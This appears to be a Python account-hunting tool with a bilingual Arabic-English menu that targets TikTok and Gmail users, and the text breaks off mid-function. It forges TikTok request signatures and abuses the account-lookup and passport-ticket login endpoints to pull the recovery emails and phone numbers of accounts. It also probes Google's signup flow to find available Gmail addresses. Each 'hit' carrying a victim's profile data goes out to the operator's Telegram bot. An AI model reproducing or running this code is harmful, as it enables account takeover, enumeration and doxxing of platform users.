import webbrowser
from cfonts import render
import time,os
C = '\033[1;34m'
E = '\033[1;33m'
R = "\033[1;31m"
RR = "\033[0m"
GG = "\033[1m\033[32m"
G = '\033[1;97m'
P='\x1b[1;97m'
B='\x1b[1;94m'
O='\x1b[1;96m'
Z='\x1b[1;30m'
X='\x1b[1;33m'
F='\x1b[2;32m'
Z='\x1b[1;31m'
L='\x1b[1;95m'
C1='\x1b[2;35m'
A='\x1b[2;39m'
P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m'
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'
a1 = '\x1b[1;35m'  # بنفسجي
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[1;36m'  # سماوي
RED = '\x1b[1;31m'  # أحمر
ORANGE = '\x1b[38;5;208m'  # برتقالي
W = '\x1b[0m'  # ابيض
from cfonts import render
import time
C = '\033[1;34m'
E = '\033[1;33m'
R = "\033[1;31m"
RR = "\033[0m"
GG = "\033[1m\033[32m"
G = '\033[1;97m'
def banner():
    print(f'''{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
    time.sleep(0.3)
   
    time.sleep(0.3)
    print(f'''{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
    time.sleep(0.3)
    print(f'''{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
    time.sleep(0.3)
    
    output = render('Karar', font='block', colors=['white', 'red'], align='center', space=True)
    print('\033[1m' + output)
    time.sleep(0.3)
    print(f'''{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
# تجربة
if __name__ == "__main__":
    banner()
print(f"""
	{W}[{a3}1{W}] {J21}= {a4}Check List TikTok {J22} - {RED} فحص لسته 
	{W}[{a3}2{W}] {J21}= {a4}Get List from country Arabs {J22} - {RED}سحب لسته من دول عربيه 
	{W}[{a3}3{W}] {J21}= {a4}Get List from Following {J22} - {RED}سحب لسته من يتابع
	{W}[{a3}4{W}] {J21}= {a4}Get List Random High {J22} - {RED}سحب لسته عالي
	{W}[{a3}5{W}] {J21}= {a4}Info from UserName {J22} - {RED}معلومات من يوزر
	{W}[{a3}6{W}] {J21}= {a4}Email To User {J22} - {RED}استخراج اليوزر من الايميل
	{W}[{a3}7{W}] {J21}= {a4}Reset Code  {J22} - {RED}ارسال كود الى ايميل
	{W}[{a3}8{W}] {J21}= {a4}Extract Sesoin {J22} - {RED}استخراج سيشن
	{W}[{a3}9{W}] {J21}= {a4}Check Level from UserName {J22} - {RED}فحص لفل من يوزر
""")
ch = int(input(f'	{W}[{RED}×{W}] {P2}Enter Number : '))

os.system('clear')
if ch==1:
	import os,sys;import requests,time,secrets,threading,string,uuid;from random import choice,randrange,randint;from uuid import uuid4;from MedoSigner import Argus,Gorgon, md5,Ladon;from urllib.parse import urlencode;import random,re,json,SignerPy,binascii
	import datetime
	from concurrent.futures import ThreadPoolExecutor
	try:
		import telebot 
	except:
		os.system('pip install telebot');os.system('pip install Pytelegrambotapi==3.7.7');os.system('clear');import telebot
	Z = '\033[1;31m';X = '\033[1;33m';F = '\033[2;32m' ;C = "\033[1;97m";B = '\033[2;36m';Y = '\033[1;34m';C = "\033[1;97m";E = '\033[1;31m';B = '\033[2;36m';G = '\033[1;32m';S = '\033[1;33m';idd=input(B+"Enter ID : ")
	tok= input(B+"Enter Token : ")

	fileuser=input(f'{S}Write Name File username :')

	os.system('clear')
	ya=0
	no=0
	nod=0
	yas=0
	kn=requests.get('https://raw.githubusercontent.com/zaid21ru/text/refs/heads/main/test').text

	nameee=[
	
	'196d5ea17130e0ff10ef183f7e150238',
	'69f53e6cfce263d3399991fe2a8e0739',
	'66087b455831238f20ef015b1edd0b85',
	'20bb70557f527eb5ebb903730c8adfdc',
	'43a171f4ed796ae7aee0f2681e5d4771',
	'a21b2d5219c96bcb7a00cd850fc3857b',
	'551a45b941e5c50e8e3e07ce86acaee9',
	'8b2dba967f78f37c3ab6a70ee71d6e56',
	'2a4b553e75abf821c9276b8871808fc7',
	'7b6e5208a1ad343141a17427e2aae408',
	'1eb5090b6533e3f0476074fe544574b9',
	'08f3374473dea81553b8368219673245',
	'bcfe2f9fe7e50667c06a47a8f01de146',
	'22ec5069e0378b0a07c5735924075a47',
	'806a4f317a0a9642a155d81d4311f226',
	'2723b41bfbc3366e3fbbd428fbe2dcd9',
	'0585c6c199fa0dc0dd0259b571226855',
	'6a7f1ec7cc06cc0e4cdb8e222115808a',
	'5ee5d7b8db9ea6adc488a6d8922f41db',
	'5a7e7c83f61e6e0e1c3ca128cd3ee79a',
	'401c36fc2d0abbdda740a52838cd31c2',
	'a3b91f7d92a916ce843690a99f0c43ee',
	'c46f26a1aa31f443e6b73a2baab4fcb4',
	'e64ed96b8c3ea51c4524b7dd25bf0abd',
	'0f92ff1418ccd9d3d9bfdf27d3a2a3b6',
	'0f92ff1418ccd9d3d9bfdf27d3a2a3b6',
	'31fffc2561f90d7780c034db4f458dad',
	'e64ed96b8c3ea51c4524b7dd25bf0abd',
	'f2a3ec8f71217f2fa2ed8507a8641920',
	'6fa98a5d216b91fb49e8bd0f50b6dc29',
	'3a19ad6aec83c77bf58ad20a95d87b02',
	'ffea1b72a3de8ebb5c1e48c91d3886cc',
	'c0ed975d7fab0b17ea77c9aac4772eda',
	'62f665d8fef41027c569a264e39d1884',
	'8799b7c86a83c99eb082e963e930b426',
	'30ad5eb572241440c7f642ad07c3972e',
	'3e815d7ed8d5ee5ed26394221cb94814',
	'b521fc106d86884df7392b0d47094b42',
	'70e134536c70bbd31b540bfb9abd9f16',
	'a79666d0aedf81af7dec5e7302ce1a6a',
	'b18a44f1169bfdcd307474ceada8090c',
	'46b49a9a910464297d4a2d703cfffb60',
	'9b465c4456506e57cbe2f673fe3d748f',
	'333c2f1fa9ccc31d05e3433f33379f23',
	'1e5aa603077be314c594aa05c85a29c7',
	'226d6f0f02dd07ea3e0e3c7e1a54ee98',
	'f60c544b5014358574cd7df1c1751f42',
	'b054149c7a2fa4681298030e91d0c033',
	'fb32c6bfd5bdef0cd0b9e5c999cf9e46',
	'11fbbcffb0525d52bc394389f24a936b',
	'30514372833cc1b571f8dc8a0f55db94',
	'88c024610ed4bf8ceb37cc92e78b4438',
	'fc1f9672a6d4177993114198414be131',
	'd8f6f9558e1807a1cd083f13de997693',
	'fef15837eef02f1ebd56523240dd5be0',
	'5e4e1267e08331d25ed7012d84f78243',
	'32df03aa0a45104c29c0eb241bfaf052',
	'277641c2bd68423af3c97ee64116c9ea',
	'608e50f670227682805b6c4db9008025',
	'f6c32b0881229967ea0e5c90635fa19e',
	'8f68c10b8a60b64e8d2dd3fcb1cdc6be',
	'497a97f73536f4f24831bebfed672258',
	'6f7a25ed7db6c0620d7d4b1a1779813d',
	'df9f5cef1f2d05757af659235150e5a6',
	'ab47913dc08abeb336556e9418449995',
	'c3b41475865dd21e2a42be682cbbeec7',
	'be5d43022279aae0fbb2810645e3a655',
	'e1f1b7e764da963f9d0dfbc2f8c811fb',
	'd0900ba89c1a62c7334db51b90d08046',
	'5eccb0f11bda1f3744d306f7a1c2e4ee',
	'871319a3e34f2034d5204f3e9d3fc9bc',
	'800266a1b9550a662a533bbe0a51edff',
	'ac8cdd63d992feda7eb1be63cd5d3cbe',
	'fe087743cb83b87fe511c4dcc2b54b9e',
	'28797e6bb6e3b4a2924bdd17d5ac2c9d',
	'ecbce30174a3109533e8c9db2b400e9f',
	'de296140fdf052974d313dffaeac39a8',
	'def6f7881ea24c7c6e2f2faafd749e33',
	'5cd2eb39aadf7c11bc741131fefe8352',
	'e2b90094da6ff546902b52c7cbcea7bb',
	'b9d8b79367847fd9dfb8647bb96edd41',
	'38df69157cd19f89825ad86e40533b3e',
	'eb3fa50f60dd60f3a415f4d57d5c368d',
	'8a9e4778c7074dc6497bce8fbc3e7be6',
	'f99638331ea251eba1dfae6ad3e331cd',
	'1d5a8ad70fe1273483834fd99ba1cdee',
	'531e7ed1aa699a929b313b8960677c07',
	'36726a0145f85571c4d7919a564a330d',
	'3e99fe2e40577af27dc4fb15f9b438f7',
	'80b98f6c3b0e9eb1737f0fb96cb73e1d',
	'99b2c615978200c679b321f04d314d49',
	'6452b4925edad1b34284d9cf4887d281',
	'475880946e2be5c2539a6c51746d2a27',
	'12700e53ced122977a6705435f8dc433',
	'99199284fc83817a51844b35e12b9a18',
	'41dede88fec05de213462698b04ce27f',
	'2c973cfb6559bc0369cefdbb75d5cbb7',
	'98b6f608bcb1a1714f7d14ec97397dad',
	'c33e3da3ec3b8e611625db85fb8ea360',
	'dc7d2164919b5432676b4a8315d8f8b3',
	'1edfd0dbb4f14549ead50fb19dc0dae3',
	'771fc5bce51efef06174c5aa78fa896c',
	'f2da58a0f3b534620e8ca7d070be1457',
	'e0a008174fbb2f2c1923e7ca2d7ae0ba',
	'160ca3c436693fcdc1165149c04d26c6',
	'6b73e7069c58abfa77d72af913c75601',
	'fb3ecd7a225441bcdf0f82a153976c51',
	'959c67bd75dce25e3913ddbe7831013c',
	'01d9a4ee761a44ab1f80d4554cc10301',
	'98ac6a1ed1cea0cd7dd86da4ad548983',
	'9e42fb4166611ce207b8bfcf8e76193d',
	'f8448f180e37a6157b2fa6728929c858',
	'300d027cc70fd71efa2dc4e1661bd053',
	'28e5067ca59aefefe8a5716a4c257019',
	'3c639274b33f920b4e2509382a26e737',
	'114f488327fe3f9e0cb7e5d0c93e18da',
	'd176247e0d0e5991755527960c9bac6e',
	'f1b2fee1dd90c445fd9c91de64b3bdbb',
	'd7f340e143dbb4eab73dd8f675d20b97',
	'7013e9767ad43770d1a86cdd45b880e5',
	'e370e7e1b0a0010360282d131c2d0613',
	'63ab5a670d8d6a9fbd14f7d3fd0b30da',
	'bc4d7382e95f3b9fa79d9164dac426e6',
	'9b19bb4e743f4220cc05770ab88164af',
	'f7a3b3d4b075b192cffd1beb30b813c7',
	'a2b82c8d086aef0c1946dee0cc6214db',
	'5fcdc96a5809d66bbb060307894a643e',
	'959e8061d7001ae76ee67a2e9ea4f263',
	'6773c0dc625db993955490cbd695999d',
	'4230e681404606e3f835eb5dc2ad21de',
	'834cdf818b735bcb62050f3d4e4ca6cf',
	'8c3e52f39908c59ef4e9b2ca1b7878c4',
	'8611ac5fe2a6c2aaba8b7a6e7928c10f',
	'd0210d3fc97f97f81b85a36c084f2e10',
	'6d48d9a4f32a8c616c90fea374b84f56',
	'aa9d4cb3400f9bef1fb81b1a0282c533',
	'4784774b438e41c63f6bbc79e3c49d0f',
	'c848604685819ec5fce059f143d94793',
	'8349d2cab77f8a74874f311afab0dc6b',
	'47d7ee7302eaf4ad67f773747ff486fd',
	'd7b6d4259088181eeccd580a9ec9e5cf',
	'f9fcbcab67b85aaa162a3be1d8376808',
	'0ae190135e514836ce46743aee147f83',
	'b84c01904844bfc45216d073852ef9b1',
	'fa2763a42b2003d21f4b0df59e09fd47',
	'99103121c3a0a19a5e64c47531727f9c',
	'071dea6260fa1e0d51f820eadae4accb',
	'7a9620194c456a1bb59248921098ee76',
	'25cc37b1ea370628f3e7a5ec751dbc37',
	'd37a92233da70de1d7734a9784496e1d',
	'5d4fec8d23a50b3b24958a9ed15d65f5',
	'09a16299b435e99b11a2844485d8cb44',
	'ff505efd41031f28a3da8de6718f2df3',
	'd1561efba0f0b7c42584c0a712ba9e08',
	'109d7c51cd047a8a339faf554728b4bf',
	'28e163347921640fda0aa48c3a3e26e6',
	'12a6ab211938a71fd78d1b3db8e5a153',
	'255bbb0d976c03671ce8108cfe11b896',
	'c22f32589db330c04e22d94794f423d7',
	'388f27cc21e32dcfe748cd26493c9002',
	'9e38d02f94634bbed9921bc094b86e47',
	'eb06afe6066ea3daeef99636e47f97b9',
	'c187abedab2202554f6f39f17d71e643',
	'e4cb96fff89c84615b6ca65eece7b67d',
	'6a64089fa0e166877f8633f7910a6341',
	'96dca9e4c68c5ece6c2910763fc39007',
	'2a8e162c4f0626e8bd2a7dc1483b27c3',
	'e14c6616279c82b7d603d67b1b2bd0cf',
	'48a1d0adf988fb326d4f1ce055c035d1',
	'cf8f84b31ddb5f2606331fc75b6d10b5',
	'b031795f45495345b7ed3bcee2be2e05',
	'6e6ebdef9d110ea8468066a99fb35431',
	'a632f2d750d448cee6638143077e4616',
	'05398d4cab356ef576ac59d31e024c5b',
	'd62a23f3121daaea933ab827e6a7296d',
	'ee266ccac29b40c71a725b47f907bdfa',
	'4d33e970315daccdfa98b0bcd289a148',
	'4de29081b58fa894e2d9dae77cc8c007',
	'05c9711180d7c27eca7c0350d3a21724',
	'fa9ccab8a9febe630c9507dd798cf2c4',
	'c305ff6eff7d6539d239fa930336f249',
	'6949c01623b5e1b80c34e8f8b69427e2',
	'03658898aa705236a6196c3a45a1a08c',
	'a7a3e019f5acb50780d666c77da882bd',
	'acd45982ed97a57232c039cdbd0361a0',
	'510341fb6c3b5b93403b170f6fcfcf71',
	'7ddfd72ec2f19222cf1d39d936e37464',
	'8b2ac569d5067237105dc2d3a9c882dd',
	'a05c9cbadfc557f88c84231e91811473',
	'e26f693a49e67140f8130cf8aaf43ac8',
	'4b41f36dec3ec80b06e867cc4d510da4',
	'e08a945fe0f95eac0825e672e5da6399',
	'aaf4396b09b2a4ae6e94e87ea355d55e',
	'62c00fd6a6ebcfa01d34c5c7e9d76fee',
	'2b944b383cbca03aaac4ffc480e607e3',
	'32165cabd98d4961d2f4b4a3956da32e',
	'21d395931e48f9e77ddd29b30e12dabe',
	'b18863134f8644b046da0ef596c95948',
	'3ef3e2f6770c58b0a33999646ac5da09',
	'4df9ab652a37448b8f1d0c260a8b36c1',
	'02a749bbec10504f4458d7408af358be',
	'9e216d83dc21148e2908873c11e8dfe5',
	'2d89305cb842264795438a7becae7746',
	'ac9989d3dd0780057acbc431a4615aab',
	'2d64fbd41353134661267af9b543d603',
	'13cfd7515fd4f8e7c3fb1c2baee1d4e5',
	'9d5d2ce46011f31fd5bb44db0aadeec7',
	'2cd4f11db806bcfdbcc080287a6a24ce',
	'a0262d0d3c387d058425f772ef2aaddc',
	'd0d4651a4b9d7de6021f5aeb39c18cb3',
	'72f145dc8a75e265ee9e54ad48d03acf',
	'02940f5f24ce2b3dc2979385fc0a0e4f',
	'1747d761d4186b49720c4553bf8e429b',
	'fc91720d1e5722dea724f96cbe7be48b',
	'90f2f7e5b184e93538b7b07aee552a7a',
	'ce87e30cd6ecdd4946b6521dc6f7f28e',
	'7b71295b2b7ece941b563d9f5a13c5d9',
	'cd8bd19192cc165634eb9b625fa51197',
	'1750338f93bf15532b7875c2fc7e5edf',
	'26af96223c9534a1fbcb6ace2669ee03',
	'1c3d0dce7e09dc846b195436a6feca5c',
	'1883abaa2abb68dfaa5385ffd8fb1210',
	'd078ec8a3d4d76336f7f5ef102a93960',
	'b9a7d4a3fe37320114a8616374025c27',
	'3fd8fc9ecff1fd02eb2188917cf9305c',
	'c6e7f8edb527733c6c83ec353d8e39d7',
	'4a502defc0a2b58eb571146bbf9f9d88',
	'38c1662a5a6f7d61b36a28c2a64c3a5c',
	'e60f73fa0e6c40d7b7ff7e6cbf84d3a3',
	'dbcc9b8c283f410c6358bc23c24a5f3e',
	]
	
	import os, time, random, uuid, binascii, json, secrets, re
	import requests
	from requests import Session, get
	import SignerPy
	
	import re, os, urllib.parse, random, binascii, uuid, time, secrets, string
	try:
	    import requests
	    from MedoSigner import Argus, Gorgon, Ladon, md5
	except ImportError:
	    os.system('pip install requests pycryptodome MedoSigner')
	    import requests
	    from MedoSigner import Argus, Gorgon, Ladon, md5
	
	def get_tiktok_level(username):
	    username = str(username)
	    def info(username):
	        headers = {
	            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Android 10; Pixel 3 Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6394.70 Mobile Safari/537.36 trill_350402 JsSdk/1.0 NetType/MOBILE Channel=googleplay AppName/trill app_version/35.3.1 ByteLocale/en ByteFullLocale/en Region/IN AppId/1180 Spark/1.5.9.1 AppVersion/35.3.1 BytedanceWebview/d8a21c6"
	        }
	        try:
	            tikinfo = requests.get(f'https://www.tiktok.com/@{username}', headers=headers, timeout=10).text
	            info = tikinfo.split('webapp.user-detail"')[1].split('"RecommenUserList"')[0]
	            id = info.split('id":"')[1].split('",')[0]
	            return id
	        except:
	            return 'h'
	    def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
	        x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload is not None else None
	        if not unix:
	            unix = int(time.time())
	        return Gorgon(params, unix, payload, cookie).get_value() | {
	            "x-ladon": Ladon.encrypt(unix, license_id, aid),
	            "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)
	        }
	    def get_level(username):
	        id = info(username)
	        if id == 'h':
	            return 'h'
	        url = f"https://webcast16-normal-no1a.tiktokv.eu/webcast/user/?request_from=profile_card_v2&request_from_scene=1&target_uid={id}&iid={random.randint(1, 10**19)}&device_id={random.randint(1, 10**19)}&ac=wifi&channel=googleplay&aid=1233&app_name=musical_ly&version_code=300102&version_name=30.1.2&device_platform=android&os=android&ab_version=30.1.2&ssmix=a&device_type=RMX3511&device_brand=realme&language=ar&os_api=33&os_version=13&openudid={binascii.hexlify(os.urandom(8)).decode()}&manifest_version_code=2023001020&resolution=1080*2236&dpi=360&update_version_code=2023001020&_rticket={round(random.uniform(1.2, 1.6) * 100000000) * -1}4632&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=ar&carrier_region=IQ&ac2=wifi&uoo=0&op_region=IQ&timezone_offset=10800&build_number=30.1.2&host_abi=arm64-v8a&locale=ar&region=IQ&content_language=gu%2C&ts={round(random.uniform(1.2, 1.6) * 100000000) * -1}&cdid={uuid.uuid4()}&webcast_sdk_version=2920&webcast_language=ar&webcast_locale=ar_IQ"
	        headers = {
	            'User-Agent': "com.zhiliaoapp.musically/2023001020 (Linux; U; Android 13; ar; RMX3511; Build/TP1A.220624.014; Cronet/TTNetVersion:06d6a583 2023-04-17 QuicVersion:d298137e 2023-02-13)"
	        }
	        headers.update(sign(url.split('?')[1], '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233))
	        try:
	            response = requests.get(url, headers=headers)
	            level = re.search(r'"default_pattern":"(.*?)"', response.text).group(1)
	            return int(level.split(' Levele ')[1])
	        except:
	            return 'h'
	    level = get_level(username)
	    if level != 'h':
	        levele=f"{level}"
	    else:
	        levele=" None "
	    return levele
	def check_rest(username):
	    result = {}
	    try:
	        user = str(username)
	        cog = secrets.token_hex(16)
	        cookies = {
	            "passport_csrf_token": cog,
	            "passport_csrf_token_default": cog
	        }
	        s = Session()
	        s.cookies.update(cookies)
	
	        url_lookup = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/username/"
	        params = {
	            'request_tag_from': "h5",
	            'fixed_mix_mode': "1",
	            'mix_mode': "1",
	            'account_param': user,
	            'scene': "4",
	            'device_platform': "android",
	            'os': "android",
	            'ssmix': "a",
	            '_rticket': str(int(time.time() * 1000)),
	            'cdid': str(uuid.uuid4()),
	            'channel': "googleplay",
	            'aid': "1233",
	            'app_name': "musical_ly",
	            'version_code': "370805",
	            'version_name': "37.8.5",
	            'manifest_version_code': "2023708050",
	            'update_version_code': "2023708050",
	            'ab_version': "37.8.5",
	            'resolution': "720*1448",
	            'dpi': "320",
	            'device_type': "RMX3269",
	            'device_brand': "realme",
	            'language': "ar",
	            'os_api': "30",
	            'os_version': "11",
	            'ac': "wifi",
	            'is_pad': "0",
	            'current_region': "IQ",
	            'app_type': "normal",
	            'sys_region': "IQ",
	            'last_install_time': str(int(time.time()) - 4000),
	            'mcc_mnc': "41840",
	            'timezone_name': "Asia/Baghdad",
	            'carrier_region_v2': "418",
	            'residence': "IQ",
	            'app_language': "ar",
	            'carrier_region': "IQ",
	            'timezone_offset': "10800",
	            'host_abi': "arm64-v8a",
	            'locale': "ar",
	            'ac2': "wifi",
	            'uoo': "0",
	            'op_region': "IQ",
	            'build_number': "37.8.5",
	            'region': "IQ",
	            'ts': str(int(time.time())),
	            'iid': str(random.randint(1, 10**19)),
	            'device_id': str(random.randint(1, 10**19)),
	            'openudid': binascii.hexlify(os.urandom(8)).decode(),
	            'support_webview': "1",
	            'cronet_version': "75b93580_2024-11-28",
	            'ttnet_version': "4.2.210.6-tiktok",
	            'use_store_region_cookie': "1",
	            'app_version': "37.8.5"
	        }
	        sig = SignerPy.sign(params=params, cookie=cookies)
	        headers = {
	            'User-Agent': "com.zhiliaoapp.musically/2023708050 (Linux; U; Android 11; ar; RMX3269; Build/RP1A.201005.001; Cronet/TTNetVersion:75b93580 2024-11-28 QuicVersion:ef6c341e 2024-11-14)",
	            'Accept': "application/json, text/plain, */*",
	            'content-length': "0",
	            'x-tt-referer': "https://inapp.tiktokv.com/ucenter_web/account_lookup_tool",
	            'x-tt-passport-csrf-token': cog,
	            'content-type': "application/x-www-form-urlencoded",
	            'x-argus': sig["x-argus"],
	            'x-gorgon': sig["x-gorgon"],
	            'x-khronos': sig["x-khronos"],
	            'x-ladon': sig["x-ladon"],
	        }
	        r1 = s.post(url_lookup, params=params, headers=headers)
	        j1 = r1.json()
	        accounts = j1.get('data', {}).get('accounts', [])
	        if not accounts:
	            return result
	        passport_ticket = accounts[0].get('passport_ticket')
	        api_username = accounts[0].get('username', user)
	        result['username'] = api_username
	        if passport_ticket:
	            params['passport_ticket'] = passport_ticket
	            sig2 = SignerPy.sign(params=params, cookie=cookies)
	            headers.update({
	                'x-argus': sig2["x-argus"],
	                'x-gorgon': sig2["x-gorgon"],
	                'x-khronos': sig2["x-khronos"],
	                'x-ladon': sig2["x-ladon"],
	            })
	            url_login = "https://api22-normal-c-alisg.tiktokv.com/passport/user/login_by_passport_ticket/"
	            r2 = s.post(url_login, params=params, headers=headers)
	            conf_raw = r2.headers.get("x-tt-verify-idv-decision-conf")
	            if conf_raw:
	                try:
	                    conf = json.loads(conf_raw)
	                    for extra in conf.get('extra', []):
	                        oo = extra.get('info', '')
	                        if '@' in oo:
	                            result['rest'] = oo
	                            domain_part = oo.split('@', 1)[1]
	                            local_rest = oo.split('@', 1)[0]
	                            if (user and local_rest and user[0] == local_rest[0] and user[-1] == local_rest[-1]):
	                                try:
	                                    web_headers = {'User-Agent': 'Mozilla/5.0'}
	                                    page = get(f'https://www.tiktok.com/@{user}', headers=web_headers, timeout=10).text
	                                    if 'followerCount":' in page:
	                                        followers = page.split('followerCount":')[1].split(',')[0]
	                                        result['followers'] = followers
	                                    result['email'] = f"{user}{domain_part}"
	                                except:
	                                    pass
	                        elif '+' in oo:
	                            result['number'] = oo
	                        else:
	                            if 'result' not in result:
	                                result['result'] = oo
	                except:
	                    pass
	
	        return result
	    except Exception:
	        return result
	def compare_rest(rest, hit):
	    try:
	        rest_local = rest.split('@')[0]
	        hit_local = hit.split('@')[0]
	        if rest_local[0] == hit_local[0] and rest_local[-1] == hit_local[-1]:
	            return True
	        else:
	            return False
	    except:
	        return False
	def info(email):
	    username=email.split("@")[0]
	    levele = get_tiktok_level(username)
	    rest_data = check_rest(username)
	    rest_value = rest_data.get('rest', 'Rest is not available !')
	    match_status = "None"
	    if rest_value != 'Note':
	        if compare_rest(rest_value, email):
	        	match_status = "None"
	
	    headers = {
	        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Safari/537.36',
	        'Accept-Language': 'en-US,en;q=0.9',
	    }
	
	    try:
	        url = f"https://www.tiktok.com/@{username}"
	        response = requests.get(url, headers=headers, timeout=15)
	        html = response.text
	        m = re.search(r'<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__".*?>(.*?)</script>', html)
	        if not m:
	            ff = f"""
	[New hits acount]            
	═━═━═━═━═━═━═━═━═━
	❄️Username :  @{account_data['user']}
	❄️Email  :  {email} 
	═━═━═━═━═━═━═━═━═━
	            """
	            requests.post(f"https://api.telegram.org/bot{tok}/sendMessage",
	                          params={'chat_id': idd, 'text': ff, 'parse_mode': 'HTML'})
	            print(ff)
	            return
	    
	        data_json = json.loads(m.group(1))
	        iinfo = data_json['__DEFAULT_SCOPE__']['webapp.user-detail']['userInfo']
	        user_obj = iinfo['user']
	        stats = iinfo['stats']
	        create_time = user_obj.get("createTime")
	        create_date = datetime.datetime.fromtimestamp(int(create_time)).strftime("%Y-%m-%d") if create_time else "غير معلوم"                    
	        account_data = {
	            'id': user_obj.get('id', 'N/A'),
	            'user': user_obj.get('uniqueId', username),
	            'name': user_obj.get('nickname', 'N/A'),
	            'folos': format(stats.get('followerCount', 0), ',d'),
	            'folon': format(stats.get('followingCount', 0), ',d'),
	            'priv': 'نعم' if user_obj.get('privateAccount') else 'لا',
	            'lik': format(stats.get('heartCount', 0), ',d'),
	            'vid': format(stats.get('videoCount', 0), ',d'),
	            'created': create_date,
	            'language': user_obj.get('language', 'غير معلوم'),
	        }        
	        ff = f"""
	[New hits acount]
	═━═━═━═━═━═━═━═━═━═━═━═
	❄️Name :  {account_data['name']}
	❄️Username :  @{account_data['user']}
	❄️Email  :  {email} 
	❄️Followers :  {account_data['folos']}
	❄️Following :  {account_data['folon']}
	❄️Likes :  {account_data['lik']}
	❄️Id :  {account_data['id']}
	❄️Created At  : {account_data['created']}
	❄️Videos : {account_data['vid']}
	❄️Private : {account_data['priv']}
	❄️Language    : {account_data['language']}
	❄️Programe : @ktk9k
    https://t.me/+usE6tGQ4aUgwZWI0
	═━═━═━═━═━═━═━═━═━═━═━═
	        """.strip()
	        with open(send, "a", encoding="utf-8") as f:
	            	f.write(ff + "\n" )
	        print(ff)
	        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage",
	                      params={'chat_id': idd, 'text': ff, 'parse_mode': 'HTML'})
	
	    except Exception as e:
	        ff = f"""
	[New hits acount]        
	═━═━═━═━═━═━═━═━═━
	❄️Username :  @{account_data['user']}
	❄️Email  :  {email} 
    https://t.me/+usE6tGQ4aUgwZWI0
	═━═━═━═━═━═━═━═━═━
	        """.strip()
	        print("خطأ:", e)
	        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage",
	                      params={'chat_id': idd, 'text': ff, 'parse_mode': 'HTML'})
	def check_gmail(email):
	    global ya,no,yas,nod
	    if '@' in email:email=email.split('@')[0]
	    if '..' in email or '_' in email or len(email) < 5 or len(email) > 30:
	        return False
	    s = requests.Session()
	    try:
	            headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9',
	    'referer': 'https://accounts.google.com/',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-browser-channel': 'stable',
	    'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
	    'x-browser-year': '2024',
	}
	            params = {
	    'biz': 'false',
	    'continue': 'https://mail.google.com/mail/u/0/',
	    'ddm': '1',
	    'emr': '1',
	    'flowEntry': 'SignUp',
	    'flowName': 'GlifWebSignIn',
	    'followup': 'https://mail.google.com/mail/u/0/',
	    'osid': '1',
	    'service': 'mail',
	}
	            response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
	            tl=response.url.split('TL=')[1]
	            s1= response.text.split('"Qzxixc":"')[1].split('"')[0]
	            at = response.text.split('"SNlM0e":"')[1].split('"')[0]
	            pass
	    except:''
	    try:
	            name = ''.join(choice('abcdefghijklmnopqrstuvwxyz') for i in range(randrange(5,10)))
	            headers = {
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
	    'origin': 'https://accounts.google.com',
	    'referer': 'https://accounts.google.com/',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
	    'x-goog-ext-391502476-jspb': '["'+s1+'"]',
	    'x-same-domain': '1',
	}
	            params = {
	    'rpcids': 'E815hb',
	    'source-path': '/lifecycle/steps/signup/name',
	    'hl': 'en-US',
	    'TL': tl,
	    'rt': 'c',
	}
	            data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name,at)
	            response = s.post(
